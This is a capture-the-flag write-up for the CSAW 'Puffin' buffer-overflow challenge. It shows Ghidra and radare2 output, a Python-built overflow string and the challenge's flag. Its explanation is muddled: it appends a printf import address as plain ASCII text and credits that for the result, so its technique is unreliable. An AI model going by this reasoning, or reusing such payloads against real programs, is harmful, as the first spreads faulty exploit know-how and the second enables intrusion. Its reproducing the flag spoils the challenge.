# Puffin
## Category: Intro
## Author: ElykDeer

# Description

>Huff, puff, and blow that buffer over.

# Ressources

We are provided with two files, puffin, and readme.txt. We also have netcat connection credentials to get the flag.

# Solution

The readme.txt file gives us an idea what we are working with. Stacks, addresses, values being saved... Sounds like a buffer overflow.

### Step one: Get the buffer size and the flag-output-function address

We can use ghidra to decompile the puffin file. If we look around in the decompiled script, we can see that the designated buffer size for the variable is 44 characters

>char local_38 [44];

Now to find out the address, we can use a dissassembler/ debugger. I will use r2.

>r2 puffin
>[#########]> aaaaaa
>[#########]> afl

Output:

>0x000006d0    1 6            sym.imp.printf

### Overflooding the buffer

Now that we have all the information we need, we can start:

>python3
> >>> "a"*44 + "b"*8 + "0x000006d0"

>'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb0x000006d0'

If we input that ouput as our input when connecting to the server, we get the flag.

# Flag

>csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....}
